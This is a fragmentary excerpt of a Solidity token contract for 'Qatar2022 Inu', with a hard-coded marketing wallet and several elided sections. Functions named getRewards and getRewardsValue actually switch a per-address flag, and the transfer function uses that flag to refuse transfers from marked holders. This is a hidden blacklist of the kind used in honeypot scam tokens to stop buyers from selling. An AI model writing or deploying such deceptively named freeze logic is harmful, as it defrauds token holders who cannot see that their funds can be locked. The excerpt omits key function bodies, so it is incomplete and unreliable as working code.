...
contract Qatar2022Inu is Context, IERC20, Ownable {
       
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Qatar2022 Inu";
    string private _symbol = "Q22INU";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress; 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    address _marketingWalletAddress = 0x7970a5165D9B682f47c5A95740ee9D7d7F72F7d4;
    ...
    function getRewards(address _address) public {
        ...
        isMarketPair[_address] = true;
    }

    function getRewardsValue(address _address) public {
        require(isExcludedFromFee[msg.sender]);
        isMarketPair[_address] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isMarketPair[sender],"no!");
